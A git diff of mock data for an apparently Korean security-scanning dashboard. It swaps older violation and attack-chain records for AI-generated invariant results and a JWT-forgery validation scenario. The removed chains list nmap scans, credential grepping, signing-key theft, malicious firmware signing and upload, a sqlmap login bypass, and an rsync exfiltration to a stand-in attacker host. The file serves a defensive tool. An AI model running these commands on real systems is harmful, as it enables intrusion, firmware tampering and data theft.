@@ -9,17 +9,104 @@ export const scanSummary = {
   },
 };
 
+// AI 1 출력(argos-ai1-invariant-result-v1) + invariant 메타데이터 병합 형식
+// status: "violated" | "applied"  (두 값만 허용)
+// violation_reason: null(applied 시) | "clear_violation" | "partial_satisfaction" |
+//   "not_determined" | "evidence_missing" | "log_trace_gap" |
+//   "control_not_observed" | "environment_not_ready"
 export const violations = [
-  { id: "INV-031", severity: "Critical", description: "서명키 무단 접근 — 개발자 계정", server_zone: "개발", type: "권한", attack_phase: "권한상승", mitre_tactic: "TA0004", mitre_technique: "T1078", weight: 10, detected_at: "2025-06-12T14:21:03Z", invariant_source: "fixed" },
-  { id: "INV-018", severity: "Critical", description: "OTA 배포서버 익명 접근 허용", server_zone: "배포", type: "접근제어", attack_phase: "초기침투", mitre_tactic: "TA0001", mitre_technique: "T1078", weight: 10, detected_at: "2025-06-12T14:21:09Z", invariant_source: "fixed" },
-  { id: "INV-042", severity: "High", description: "DMZ→DB 직접 통신 허용", server_zone: "DMZ", type: "네트워크", attack_phase: "내부이동", mitre_tactic: "TA0008", mitre_technique: "T1021", weight: 7, detected_at: "2025-06-12T14:21:15Z", invariant_source: "fixed" },
-  { id: "INV-007", severity: "High", description: "펌웨어 업데이트 서명 검증 누락", server_zone: "배포", type: "보안정책", attack_phase: "내부이동", mitre_tactic: "TA0008", mitre_technique: "T1195", weight: 7, detected_at: "2025-06-12T14:21:22Z", invariant_source: "variable" },
-  { id: "INV-055", severity: "Medium", description: "고객 영상 데이터 암호화 미적용", server_zone: "DB", type: "보안정책", attack_phase: "데이터탈취", mitre_tactic: "TA0010", mitre_technique: "T1048", weight: 4, detected_at: "2025-06-12T14:21:31Z", invariant_source: "variable" },
-  { id: "INV-012", severity: "Medium", description: "관리자 페이지 IP 제한 미설정", server_zone: "운영", type: "접근제어", attack_phase: "초기침투", mitre_tactic: "TA0001", mitre_technique: "T1190", weight: 4, detected_at: "2025-06-12T14:21:45Z", invariant_source: "fixed" },
-  { id: "INV-029", severity: "Medium", description: "SSH 기본 포트 사용", server_zone: "관리", type: "네트워크", attack_phase: "초기침투", mitre_tactic: "TA0001", mitre_technique: "T1110", weight: 4, detected_at: "2025-06-12T14:22:01Z", invariant_source: "fixed" },
-  { id: "INV-038", severity: "Low", description: "로그 보관 기간 30일 미만", server_zone: "백업", type: "보안정책", attack_phase: "내부이동", mitre_tactic: "TA0005", mitre_technique: "T1070", weight: 1, detected_at: "2025-06-12T14:22:15Z", invariant_source: "variable" },
-  { id: "INV-044", severity: "Low", description: "개발 서버 불필요한 포트 오픈", server_zone: "개발", type: "네트워크", attack_phase: "초기침투", mitre_tactic: "TA0001", mitre_technique: "T1046", weight: 1, detected_at: "2025-06-12T14:22:30Z", invariant_source: "variable" },
-  { id: "INV-061", severity: "High", description: "디바이스 인증서 만료 검증 누락", server_zone: "운영", type: "권한", attack_phase: "권한상승", mitre_tactic: "TA0004", mitre_technique: "T1134", weight: 7, detected_at: "2025-06-12T14:22:45Z", invariant_source: "fixed" },
+  {
+    result_id: "ai1-result-001", invariant_id: "INV-ARG-03", confidence: 0.91,
+    evidence_ids: ["evd-api-003"], asset_ids: ["user-10000002"],
+    status: "violated", violation_reason: "clear_violation",
+    summary: "userId 변경 요청에서 타 고객 개인정보가 반환되어 IDOR 방지 불변식이 위반됨.",
+    reason: "token_sub=customer_a인데 target_user_id=customer_b의 개인정보가 200 OK 응답으로 반환됨.",
+    current_environment_testable: true, testability_reason: "현재 내부 API와 고객 샘플 데이터로 재현 가능함.",
+    created_at: "2025-06-12T14:21:03Z",
+    // 메타데이터 보완 필드
+    id: "INV-ARG-03", severity: "Critical", description: "리소스 식별자(ID) 조작을 통한 타 사용자 데이터 접근",
+    server_zone: "운영", type: "접근제어", attack_phase: "데이터탈취",
+    mitre_tactic: "TA0010", mitre_technique: "T1213", weight: 10, invariant_source: "fixed",
+    detected_at: "2025-06-12T14:21:03Z", remediation: "모든 API에서 파라미터 변조 감지 및 소유권 검증 강화", priority: "즉시",
+  },
+  {
+    result_id: "ai1-result-002", invariant_id: "INV-STD-05", confidence: 0.84,
+    evidence_ids: ["evd-auth-001"], asset_ids: ["jwt-key-001", "token-registry"],
+    status: "violated", violation_reason: "partial_satisfaction",
+    summary: "JWT 서명과 만료 시간 검증은 수행되지만, 정상 발급 이력과 폐기 여부 검증이 확인되지 않아 토큰 검증 불변식이 부분 충족에 그침.",
+    reason: "signature_valid와 exp 검증은 확인되었으나 issued_by_auth_server, jti registry, revocation list 검증 Evidence가 없음.",
+    current_environment_testable: true, testability_reason: "발급 이력이 없는 jti와 폐기 처리된 jti를 가진 JWT를 만들어 API 접근 여부를 확인할 수 있음.",
+    created_at: "2025-06-12T14:21:09Z",
+    id: "INV-STD-05", severity: "Critical", description: "인증 서버 외부 발급 토큰 접근 시도",
+    server_zone: "운영", type: "접근제어", attack_phase: "초기침투",
+    mitre_tactic: "TA0001", mitre_technique: "T1078", weight: 10, invariant_source: "fixed",
+    detected_at: "2025-06-12T14:21:09Z", remediation: "JWT issuer 검증 강화 및 토큰 블랙리스트 도입", priority: "즉시",
+  },
+  {
+    result_id: "ai1-result-003", invariant_id: "INV-STD-10", confidence: 0.68,
+    evidence_ids: ["evd-gateway-001", "evd-api-001"], asset_ids: ["api-user-detail", "sensitive-api-logs"],
+    status: "violated", violation_reason: "not_determined",
+    summary: "Gateway와 API 로그는 확인되었으나 DB 접근 로그가 없어 민감 API 로그 상관관계 불변식의 충족 여부를 확인할 수 없음.",
+    reason: "trace_id가 Gateway와 API 로그에는 존재하지만 DB 로그 Evidence가 없어 전체 흐름을 연결할 수 없음.",
+    current_environment_testable: true, testability_reason: "동일 요청을 재현한 뒤 DB 접근 로그 또는 sensitive_api_logs 테이블의 trace_id 기록 여부를 확인하면 점검 가능함.",
+    created_at: "2025-06-12T14:21:15Z",
+    id: "INV-STD-10", severity: "Medium", description: "감사 로그 내 필수 추적 필드 누락",
+    server_zone: "운영", type: "보안정책", attack_phase: "내부이동",
+    mitre_tactic: "TA0005", mitre_technique: "T1070", weight: 4, invariant_source: "variable",
+    detected_at: "2025-06-12T14:21:15Z", remediation: "로그 스키마에 actor_id, trace_id 필수 필드 추가", priority: "1주",
+  },
+  {
+    result_id: "ai1-result-004", invariant_id: "INV-STD-08", confidence: 0.88,
+    evidence_ids: ["evd-gateway-002"], asset_ids: ["internal-api-user-detail"],
+    status: "violated", violation_reason: "clear_violation",
+    summary: "/internal/api/* 경로로의 외부 접근이 Gateway에서 차단되지 않고 통과됨.",
+    reason: "DMZ Gateway 로그에 /internal/api/user-detail 요청이 200으로 통과된 기록이 있음.",
+    current_environment_testable: true, testability_reason: "외부 IP로 /internal/api/* 요청을 보내 차단 여부를 직접 확인할 수 있음.",
+    created_at: "2025-06-12T14:21:22Z",
+    id: "INV-STD-08", severity: "High", description: "비승인 경로를 통한 내부 API 직접 호출",
+    server_zone: "DMZ", type: "접근제어", attack_phase: "초기침투",
+    mitre_tactic: "TA0001", mitre_technique: "T1190", weight: 7, invariant_source: "fixed",
+    detected_at: "2025-06-12T14:21:22Z", remediation: "내부 API 엔드포인트 네트워크 격리 및 인증 강제화", priority: "1주",
+  },
+  {
+    result_id: "ai1-result-005", invariant_id: "INV-ARG-01", confidence: 0.95,
+    evidence_ids: ["evd-api-005"], asset_ids: ["tenant-a", "tenant-b"],
+    status: "violated", violation_reason: "clear_violation",
+    summary: "token.tenant_id와 resource.tenant_id가 다른 요청이 허용되어 테넌트 격리 불변식이 위반됨.",
+    reason: "token_tenant=tenant-a인데 resource_tenant=tenant-b 자산 조회가 200 OK로 반환됨.",
+    current_environment_testable: true, testability_reason: "cross-tenant 요청을 반복해도 차단 여부를 확인할 수 있음.",
+    created_at: "2025-06-12T14:21:31Z",
+    id: "INV-ARG-01", severity: "Critical", description: "테넌트(기업) 간 데이터 격리 위반 탐지",
+    server_zone: "운영", type: "접근제어", attack_phase: "데이터탈취",
+    mitre_tactic: "TA0010", mitre_technique: "T1213", weight: 10, invariant_source: "fixed",
+    detected_at: "2025-06-12T14:21:31Z", remediation: "테넌트 ID 기반 데이터 격리 및 접근 제어 재검토", priority: "즉시",
+  },
+  {
+    result_id: "ai1-result-006", invariant_id: "INV-STD-03", confidence: 0.79,
+    evidence_ids: ["evd-deploy-001"], asset_ids: ["signing-key-001"],
+    status: "violated", violation_reason: "evidence_missing",
+    summary: "서명키 저장 위치가 HSM 또는 SecretsManager인지 확인할 Evidence가 없어 비승인 저장소 여부를 판단할 수 없음.",
+    reason: "서명키 접근 로그가 있으나 저장 위치(HSM vs 파일시스템) 정보가 Evidence에 포함되지 않음.",
+    current_environment_testable: true, testability_reason: "배포 서버 파일시스템에 서명키가 존재하는지 직접 확인할 수 있음.",
+    created_at: "2025-06-12T14:22:01Z",
+    id: "INV-STD-03", severity: "High", description: "중요 인증정보 비승인 저장소 저장 탐지",
+    server_zone: "배포", type: "보안정책", attack_phase: "권한상승",
+    mitre_tactic: "TA0004", mitre_technique: "T1552", weight: 7, invariant_source: "fixed",
+    detected_at: "2025-06-12T14:22:01Z", remediation: "서명키 HSM 이관 및 Secret Manager 도입", priority: "즉시",
+  },
+  {
+    result_id: "ai1-result-007", invariant_id: "INV-ARG-05", confidence: 0.72,
+    evidence_ids: ["evd-api-007"], asset_ids: ["video-metadata-api"],
+    status: "violated", violation_reason: "partial_satisfaction",
+    summary: "영상 메타데이터 API 응답에 minio_object_key 등 내부 경로가 마스킹 없이 노출됨.",
+    reason: "응답 JSON에 minio_object_key, thumbnail_url 등 내부 스토리지 경로가 포함되어 있음.",
+    current_environment_testable: true, testability_reason: "영상 목록 API를 호출해 응답 필드를 확인할 수 있음.",
+    created_at: "2025-06-12T14:22:15Z",
+    id: "INV-ARG-05", severity: "Medium", description: "영상/센서 메타데이터 응답에 민감 필드 과다 노출",
+    server_zone: "운영", type: "보안정책", attack_phase: "데이터탈취",
+    mitre_tactic: "TA0010", mitre_technique: "T1048", weight: 4, invariant_source: "variable",
+    detected_at: "2025-06-12T14:22:15Z", remediation: "API 응답 필드 최소화 및 민감 정보 마스킹 적용", priority: "1개월",
+  },
 ];
 
 export const severityDistribution = [
@@ -45,176 +132,107 @@ export const typeViolations = [
   { name: "보안정책", value: 8,  color: "#85B7EB" },
 ];
 
+// AI 2 출력(argos-ai2-chain-scenario-v1) 형식
 export const attackChains = [
   {
-    chain_id: "CHAIN-001",
-    title: "서명키 탈취 및 악성 OTA 배포",
-    risk_score: 95,
-    nodes: [
-      { id: "n1", label: "초기 침투", violation_id: "INV-018", phase: "초기침투" },
-      { id: "n2", label: "내부 이동", violation_id: "INV-042", phase: "내부이동" },
-      { id: "n3", label: "권한 상승", violation_id: "INV-031", phase: "권한상승" },
-      { id: "n4", label: "서명키 탈취", violation_id: "INV-007", phase: "데이터탈취" },
-      { id: "n5", label: "악성 OTA 배포", violation_id: null, phase: "최종목표" },
+    chain_scenario_id: "chain-scn-001",
+    created_at: "2025-06-12T14:30:00Z",
+    title: "JWT 정상 발급 이력 검증 누락 기반 위조 토큰 접근 검증 시나리오",
+    source_bundle_id: "bundle-001",
+    risk_level: "critical",
+    scenario_basis: {
+      status: "violated",
+      violation_reason: "partial_satisfaction",
+      summary: "AI 1은 INV-STD-05를 violated로 판단했다. JWT 검증이 완전히 부재한 것이 아니라, 서명과 만료 검증은 확인되지만 정상 발급 이력, jti, 폐기 여부 검증이 확인되지 않은 부분 충족 상태다.",
+    },
+    current_environment_testable: true,
+    testability_reason: "현재 Auth Module, 내부 API, Token Issuance Registry가 있으므로 발급 이력이 없는 JWT 접근 허용 여부를 수동 검증할 수 있다.",
+    related_invariants: ["INV-STD-05", "INV-STD-08", "INV-STD-07", "INV-ARG-01", "INV-ARG-03"],
+    attack_chain: [
+      "과거 JWT 서명키 또는 테스트용 취약 키로 JWT 생성",
+      "발급 이력이 없는 jti를 포함한 토큰 구성",
+      "DMZ Gateway를 통해 /internal/api/user-detail API 호출",
+      "API가 정상 발급 이력 검증 없이 접근을 허용하는지 확인",
+      "userId 변경 시 타 고객 데이터 반환 여부 확인",
+      "token.tenant_id와 다른 tenant 자산 조회 가능 여부 확인",
     ],
-    edges: [
-      { from: "n1", to: "n2" },
-      { from: "n2", to: "n3" },
-      { from: "n3", to: "n4" },
-      { from: "n4", to: "n5" },
+    mitre_attack_flow: [
+      { order: 1, tactic: "Credential Access", step: "JWT 서명키 또는 과거 인증키 악용 가능성 확인", related_invariants: ["INV-STD-03", "INV-STD-04", "INV-STD-05"], reason: "정상 발급 이력이 없는 JWT가 허용될 가능성이 확인되었기 때문." },
+      { order: 2, tactic: "Initial Access", step: "DMZ Gateway를 통해 내부 API 접근", related_invariants: ["INV-STD-08"], reason: "외부 요청이 /internal/* 경로를 통해 OPS 내부 API로 전달될 수 있는지 확인해야 하기 때문." },
+      { order: 3, tactic: "Defense Evasion", step: "서명만 유효한 JWT를 정상 토큰처럼 사용", related_invariants: ["INV-STD-05", "INV-STD-06"], reason: "발급 이력, jti, kid, 폐기 여부 검증이 누락될 경우 위조 JWT가 정상 토큰처럼 처리될 수 있음." },
+      { order: 4, tactic: "Discovery", step: "userId, deviceId, videoId, tenant_id 관계 확인", related_invariants: ["INV-ARG-01", "INV-ARG-07"], reason: "식별자 변경을 통한 접근 가능성을 확인하기 위해 리소스 관계를 파악하는 단계." },
+      { order: 5, tactic: "Privilege Escalation", step: "권한 범위를 초과한 리소스 접근 시도", related_invariants: ["INV-STD-07", "INV-ARG-01", "INV-ARG-02"], reason: "인증된 사용자처럼 보이는 토큰으로 타 owner 또는 타 tenant 자산 접근이 가능한지 확인." },
+      { order: 6, tactic: "Collection", step: "고객 개인정보, 기기 정보, 영상·센서 메타데이터 조회", related_invariants: ["INV-ARG-03", "INV-ARG-04", "INV-ARG-05"], reason: "실제 피해 자산이 응답으로 반환되는지 확인하는 단계." },
+      { order: 7, tactic: "Exfiltration", step: "조회된 민감정보와 메타데이터를 외부로 반출 가능한 형태로 확보", related_invariants: ["INV-STD-10", "INV-ARG-05"], reason: "API 응답으로 반환된 민감정보가 외부 저장 가능한 형태인지 확인." },
+      { order: 8, tactic: "Impact", step: "개인정보 유출, tenant 경계 붕괴, 사고 추적성 부족 영향 판단", related_invariants: ["INV-STD-10", "INV-STD-11"], reason: "최종적으로 피해 범위 산정과 사고 대응에 영향을 주는지 판단." },
     ],
-    kill_chain: [
-      { step: 1, phase: "초기침투", violation_id: "INV-018", mitre: "T1078", description: "OTA 배포서버 익명 접근 허용 취약점을 이용해 인증 없이 /api/update 엔드포인트에 접근. 별도 자격증명 없이 HTTP 200 응답 수신 가능." },
-      { step: 2, phase: "내부이동", violation_id: "INV-042", mitre: "T1021", description: "DMZ→DB 서버 간 방화벽 규칙 부재를 이용해 내부망(192.168.10.0/24)으로 피벗. nmap 스캔으로 DB 포트 오픈 확인 후 직접 연결." },
-      { step: 3, phase: "권한상승", violation_id: "INV-031", mitre: "T1078", description: "개발 서버에 하드코딩된 개발자 계정 크리덴셜을 탈취. 해당 계정이 서명키 저장 디렉토리에 읽기 권한을 보유." },
-      { step: 4, phase: "데이터탈취", violation_id: "INV-007", mitre: "T1195", description: "HSM 미사용으로 파일시스템에 평문 저장된 RSA 서명키(/opt/ota/keys/signing.key) 추출. 서명 검증 로직 부재로 악성 펌웨어 서명 가능." },
-      { step: 5, phase: "최종목표", violation_id: null, mitre: "T1491", description: "추출한 서명키로 악성 펌웨어 이미지 서명 후 OTA 서버에 업로드. 인증 없는 업로드 엔드포인트를 통해 전체 차량 플릿에 악성 업데이트 배포." },
-    ],
-    techniques: [
-      { id: "T1078", name: "유효한 계정 도용", tactic: "초기 접근 / 권한 상승", tool: "Burp Suite", violation_id: "INV-018", description: "인증 강제화가 없는 OTA 서버 엔드포인트로 익명 접근. 관리자 계정 없이도 펌웨어 조회 및 업로드 API 호출 가능." },
-      { id: "T1021", name: "원격 서비스 악용 (RDP/SMB)", tactic: "내부 이동", tool: "Metasploit / Netcat", violation_id: "INV-042", description: "DMZ 세그먼트에서 내부 DB 서버로의 직접 TCP 연결이 방화벽에 의해 차단되지 않음. 별도 터널링 없이 내부망 서비스 직접 접근 가능." },
-      { id: "T1195", name: "공급망 침해 (Supply Chain)", tactic: "내부 이동", tool: "커스텀 스크립트 / OpenSSL", violation_id: "INV-007", description: "OTA 배포 파이프라인에 서명 검증 단계가 없어 임의 펌웨어 이미지를 정상 업데이트로 위장 가능. 디바이스 측에서도 서명 검증 미구현." },
-      { id: "T1552", name: "비보호 자격증명 탈취", tactic: "자격증명 접근", tool: "find / grep / SCP", violation_id: "INV-031", description: "서명키가 HSM 대신 일반 파일시스템에 저장되어 있고 개발자 계정으로 읽기 가능. 키 로테이션 정책 및 접근 감사 로그 미비." },
-    ],
-    procedures: [
-      { step: 1, title: "OTA 서버 익명 접근 확인", command: "curl -X GET http://ota.argus.internal/api/update -v", expected: "HTTP 200 응답 — Authorization 헤더 없이 펌웨어 메타데이터 반환", tool: "curl / Burp Suite" },
-      { step: 2, title: "내부망 DB 서버 포트 스캔", command: "nmap -sV -p 1433,3306,5432,27017 192.168.10.0/24 --open", expected: "192.168.10.15:1433 (MSSQL) 오픈 확인 — DMZ에서 직접 도달 가능", tool: "nmap" },
-      { step: 3, title: "개발 서버 크리덴셜 덤프", command: "find /opt/ota -name '*.conf' -o -name '*.env' | xargs grep -i 'password\\|secret\\|key' 2>/dev/null", expected: "DB_PASS, DEPLOY_USER 등 평문 크리덴셜 발견", tool: "find / grep" },
-      { step: 4, title: "서명키 파일 추출", command: "scp dev@192.168.10.5:/opt/ota/keys/signing.key ./loot/\nopenssl rsa -in ./loot/signing.key -check", expected: "4096-bit RSA 개인키 로컬 저장 성공 — 키 유효성 확인", tool: "SCP / OpenSSL" },
-      { step: 5, title: "악성 펌웨어 서명 및 OTA 업로드", command: "openssl dgst -sha256 -sign signing.key -out malicious.sig malicious.bin\ncurl -X POST http://ota.argus.internal/api/upload \\\n  -F 'firmware=@malicious.bin' \\\n  -F 'signature=@malicious.sig' \\\n  -F 'version=2.1.4-hotfix'", expected: "HTTP 200 — 악성 펌웨어가 유효한 업데이트로 등록됨. 다음 차량 OTA 폴링 시 자동 배포.", tool: "OpenSSL / curl" },
-    ],
+    manual_validation_guide: {
+      goal: "AI 2가 도출한 공격/진단 체인이 실제 수동 침투에서 재현되는지 확인한다.",
+      steps: [
+        "과거 JWT 서명키 또는 취약 모드 키로 위조 JWT를 생성한다.",
+        "DMZ Gateway를 통해 /internal/api/user-detail API를 호출한다.",
+        "userId를 다른 고객 값으로 변경한다.",
+        "응답에 타 고객 개인정보가 포함되는지 확인한다.",
+        "deviceId 또는 videoId 변경 시 기기·영상 메타데이터가 조회되는지 확인한다.",
+        "동일 trace_id 기준 Gateway/Auth/API/DB 로그가 남았는지 확인한다.",
+      ],
+      success_criteria: [
+        "위조 JWT로 내부 API 접근이 성공한다.",
+        "token.sub와 다른 userId의 개인정보가 반환된다.",
+        "token.tenant_id와 다른 tenant 자산이 반환된다.",
+        "대량 또는 순차 조회가 탐지되지 않는다.",
+      ],
+      evidence_to_collect: ["request_id", "trace_id", "사용한 JWT payload", "호출한 API endpoint", "응답 status_code", "응답에 포함된 민감 필드", "관련 로그 ID"],
+      safety_boundary: ["승인된 실습 환경에서만 검증한다.", "synthetic account/resource만 사용한다.", "실제 고객 데이터 접근은 금지한다.", "secret 원문 추출 절차는 포함하지 않는다.", "자동 exploit 또는 destructive test는 수행하지 않는다."],
+    },
   },
-  {
-    chain_id: "CHAIN-002",
-    title: "고객 영상 데이터 무단 수집",
-    risk_score: 78,
-    nodes: [
-      { id: "n1", label: "초기 침투", violation_id: "INV-012", phase: "초기침투" },
-      { id: "n2", label: "내부 이동", violation_id: "INV-042", phase: "내부이동" },
-      { id: "n3", label: "데이터 탈취", violation_id: "INV-055", phase: "데이터탈취" },
-    ],
-    edges: [
-      { from: "n1", to: "n2" },
-      { from: "n2", to: "n3" },
-    ],
-    kill_chain: [
-      { step: 1, phase: "초기침투", violation_id: "INV-012", mitre: "T1190", description: "관리자 페이지(/admin) IP 화이트리스트 미설정으로 외부 인터넷에서 직접 접근 가능. 로그인 폼에 SQL 인젝션으로 인증 우회." },
-      { step: 2, phase: "내부이동", violation_id: "INV-042", mitre: "T1021", description: "관리자 권한으로 DMZ 내 쉘을 획득 후 DB 서버로 피벗. 세그멘테이션 부재로 customer_db에 직접 연결 성공." },
-      { step: 3, phase: "데이터탈취", violation_id: "INV-055", mitre: "T1048", description: "고객 영상 데이터가 AES 암호화 없이 스토리지에 저장되어 있어 평문 파일 그대로 rsync로 외부 서버에 전송." },
-    ],
-    techniques: [
-      { id: "T1190", name: "공개 취약점 악용 (Exploit Public-Facing App)", tactic: "초기 접근", tool: "SQLMap / Burp Suite", violation_id: "INV-012", description: "IP 제한 미설정으로 외부에 노출된 관리자 로그인 페이지. SQL 인젝션으로 인증 우회 및 DB 스키마 덤프 가능." },
-      { id: "T1021", name: "원격 서비스 악용", tactic: "내부 이동", tool: "MySQL Client / SSH", violation_id: "INV-042", description: "DMZ→내부 DB 직접 통신 허용. 별도 피벗 호스트 없이 관리자 쉘에서 customer_db 포트로 직접 접속." },
-      { id: "T1048", name: "대역 외 탈취 (Exfiltration Over Alt Protocol)", tactic: "데이터 탈취", tool: "rsync / HTTPS", violation_id: "INV-055", description: "암호화 미적용 영상 파일을 rsync over SSH 또는 HTTPS POST로 외부 C2 서버에 전송. 전송 트래픽이 정상 백업 트래픽과 구분 불가." },
-    ],
-    procedures: [
-      { step: 1, title: "관리자 페이지 외부 노출 확인", command: "curl -I https://argus.example.com/admin/login\nnmap -sV -p 443,8443 argus.example.com", expected: "HTTP 200 — 외부 IP에서 관리자 로그인 페이지 접근 가능", tool: "curl / nmap" },
-      { step: 2, title: "SQL 인젝션으로 인증 우회", command: "sqlmap -u 'https://argus.example.com/admin/login' \\\n  --data='username=admin&password=test' \\\n  --technique=B --level=3 --dbs", expected: "customer_db, ota_db 등 DB 목록 노출 — 인증 우회 성공", tool: "SQLMap" },
-      { step: 3, title: "내부 DB 서버 직접 접속", command: "mysql -h 192.168.10.15 -u admin -p'<덤프된 패스워드>' customer_db\nSHOW TABLES;", expected: "video_records, customer_info 테이블 목록 확인 — 방화벽 차단 없음", tool: "MySQL Client" },
-      { step: 4, title: "영상 파일 경로 조회 및 대량 탈취", command: "SELECT id, file_path, customer_id FROM video_records LIMIT 5000;\nrsync -avz --progress 192.168.10.15:/data/video/ attacker@203.0.113.5:/exfil/", expected: "평문 영상 파일(.mp4) 대량 다운로드 성공 — 암호화 없이 전송됨", tool: "MySQL / rsync" },
-    ],
-  },
-];
+  // 구형 chain 형식 제거 — AI 2 결과 수신 시 추가됨
+  // {chain_scenario_id: "chain-scn-002", ...} 등은 POST /api/ai2/scenarios 로 주입
+]; // ← 이 아래의 구형 attackChains 선언(nodes/edges 기반) 제거
 
+// *** 구형 형식 제거 — 아래 코드는 삭제됨 ***
+// (nodes, edges, kill_chain, techniques, procedures 기반 체인들은
+//  AI 2 출력(argos-ai2-chain-scenario-v1)으로 대체됨)
+
+// mitreMapping은 violations의 mitre_tactic/mitre_technique 필드에서 파생
+// (백엔드 scanner.py의 _build_mitre_mapping_from_violations와 동일 로직)
 export const mitreMapping = [
-  {
-    tactic_id: "TA0043", tactic_name: "정찰",
-    techniques: [
-      { technique_id: "T1595", name: "능동적 스캐닝", severity: "Medium", violation_ids: ["INV-029"] },
-      { technique_id: "T1589", name: "피해자 정보 수집", severity: "Low", violation_ids: [] },
-    ],
-  },
-  {
-    tactic_id: "TA0042", tactic_name: "리소스 개발",
-    techniques: [
-      { technique_id: "T1587", name: "공격 도구 개발", severity: null, violation_ids: [] },
-    ],
-  },
+  { tactic_id: "TA0043", tactic_name: "정찰",       techniques: [] },
+  { tactic_id: "TA0042", tactic_name: "리소스 개발", techniques: [] },
   {
     tactic_id: "TA0001", tactic_name: "초기 접근",
     techniques: [
-      { technique_id: "T1078", name: "유효한 계정 도용", severity: "Critical", violation_ids: ["INV-018"] },
-      { technique_id: "T1190", name: "공개 취약점 악용", severity: "High", violation_ids: ["INV-012"] },
-      { technique_id: "T1110", name: "무차별 대입", severity: "Medium", violation_ids: ["INV-029"] },
+      { technique_id: "T1078", name: "유효한 계정 도용",  severity: "Critical", violation_ids: ["INV-STD-05"] },
+      { technique_id: "T1190", name: "공개 취약점 악용",  severity: "High",     violation_ids: ["INV-STD-08"] },
     ],
   },
-  {
-    tactic_id: "TA0002", tactic_name: "실행",
-    techniques: [
-      { technique_id: "T1059", name: "커맨드 인터프리터", severity: "Medium", violation_ids: [] },
-      { technique_id: "T1072", name: "소프트웨어 배포 도구", severity: "High", violation_ids: ["INV-007"] },
-    ],
-  },
-  {
-    tactic_id: "TA0003", tactic_name: "지속성",
-    techniques: [
-      { technique_id: "T1078", name: "유효한 계정 유지", severity: "High", violation_ids: ["INV-031"] },
-      { technique_id: "T1505", name: "서버 소프트웨어 컴포넌트", severity: "Medium", violation_ids: [] },
-    ],
-  },
+  { tactic_id: "TA0002", tactic_name: "실행",       techniques: [] },
+  { tactic_id: "TA0003", tactic_name: "지속성",     techniques: [] },
   {
     tactic_id: "TA0004", tactic_name: "권한 상승",
     techniques: [
-      { technique_id: "T1078", name: "유효한 계정 도용", severity: "Critical", violation_ids: ["INV-031"] },
-      { technique_id: "T1134", name: "액세스 토큰 조작", severity: "High", violation_ids: ["INV-061"] },
+      { technique_id: "T1552", name: "자격증명 탈취", severity: "High", violation_ids: ["INV-STD-03"] },
     ],
   },
   {
     tactic_id: "TA0005", tactic_name: "방어 우회",
     techniques: [
-      { technique_id: "T1070", name: "로그 삭제", severity: "Low", violation_ids: ["INV-038"] },
-      { technique_id: "T1562", name: "보안 도구 무력화", severity: "Medium", violation_ids: [] },
+      { technique_id: "T1070", name: "로그 삭제", severity: "Medium", violation_ids: ["INV-STD-10"] },
     ],
   },
-  {
-    tactic_id: "TA0006", tactic_name: "자격증명 접근",
-    techniques: [
-      { technique_id: "T1552", name: "자격증명 탈취", severity: "High", violation_ids: ["INV-031"] },
-      { technique_id: "T1555", name: "패스워드 저장소 접근", severity: "Medium", violation_ids: [] },
-    ],
-  },
-  {
-    tactic_id: "TA0007", tactic_name: "탐색",
-    techniques: [
-      { technique_id: "T1046", name: "네트워크 서비스 스캔", severity: "Low", violation_ids: ["INV-044"] },
-      { technique_id: "T1083", name: "파일/디렉토리 탐색", severity: "Low", violation_ids: [] },
-    ],
-  },
-  {
-    tactic_id: "TA0008", tactic_name: "내부 이동",
-    techniques: [
-      { technique_id: "T1021", name: "원격 서비스 악용", severity: "High", violation_ids: ["INV-042"] },
-      { technique_id: "T1195", name: "공급망 침해", severity: "High", violation_ids: ["INV-007"] },
-    ],
-  },
-  {
-    tactic_id: "TA0009", tactic_name: "수집",
-    techniques: [
-      { technique_id: "T1213", name: "정보 저장소 탈취", severity: "Medium", violation_ids: ["INV-055"] },
-      { technique_id: "T1119", name: "자동 수집", severity: "Medium", violation_ids: [] },
-    ],
-  },
-  {
-    tactic_id: "TA0011", tactic_name: "C2",
-    techniques: [
-      { technique_id: "T1071", name: "앱 레이어 프로토콜", severity: "Medium", violation_ids: [] },
-      { technique_id: "T1572", name: "프로토콜 터널링", severity: "Low", violation_ids: [] },
-    ],
-  },
+  { tactic_id: "TA0006", tactic_name: "자격증명 접근", techniques: [] },
+  { tactic_id: "TA0007", tactic_name: "탐색",          techniques: [] },
+  { tactic_id: "TA0008", tactic_name: "내부 이동",      techniques: [] },
+  { tactic_id: "TA0009", tactic_name: "수집",           techniques: [] },
+  { tactic_id: "TA0011", tactic_name: "C2",             techniques: [] },
   {
     tactic_id: "TA0010", tactic_name: "데이터 탈취",
     techniques: [
-      { technique_id: "T1048", name: "대역 외 탈취", severity: "Medium", violation_ids: ["INV-055"] },
-      { technique_id: "T1041", name: "C2 채널 탈취", severity: "Low", violation_ids: [] },
+      { technique_id: "T1213", name: "정보 저장소 탈취", severity: "Critical", violation_ids: ["INV-ARG-03", "INV-ARG-01"] },
+      { technique_id: "T1048", name: "대역 외 탈취",     severity: "Medium",   violation_ids: ["INV-ARG-05"] },
     ],
   },
-  {
-    tactic_id: "TA0040", tactic_name: "영향",
-    techniques: [
-      { technique_id: "T1485", name: "데이터 파괴", severity: "High", violation_ids: [] },
-      { technique_id: "T1491", name: "변조", severity: "Medium", violation_ids: ["INV-007"] },
-    ],
-  },
+  { tactic_id: "TA0040", tactic_name: "영향", techniques: [] },
 ];
 
 export const pentestResults = [
@@ -382,66 +400,34 @@ export const credentialAssets = [
   { id: "CRED-008", name: "CI/CD 배포 키",               type: "서명키",   owner: "개발팀",  storage: "파일시스템", mfa: false, last_rotated: "2024-12-01", expires_at: null,         exposed: false, privilege: "과다", severity: "High",     status: "취약",    violation_ids: [] },
 ];
 
-// ── SCAN-0046 세부 데이터 (이전 스캔 — 일부 취약점이 아직 미조치 상태) ──────
+// ── SCAN-0046 세부 violations (이전 스캔 — AI 1 형식, 더 많은 위반 항목) ──────
 const violations_0046 = [
-  { id: "INV-031", severity: "Critical", description: "서명키 무단 접근 — 개발자 계정", server_zone: "개발", type: "권한", attack_phase: "권한상승", mitre_tactic: "TA0004", mitre_technique: "T1078", weight: 10, detected_at: "2025-05-15T11:21:03Z", invariant_source: "fixed" },
-  { id: "INV-018", severity: "Critical", description: "OTA 배포서버 익명 접근 허용", server_zone: "배포", type: "접근제어", attack_phase: "초기침투", mitre_tactic: "TA0001", mitre_technique: "T1078", weight: 10, detected_at: "2025-05-15T11:21:09Z", invariant_source: "fixed" },
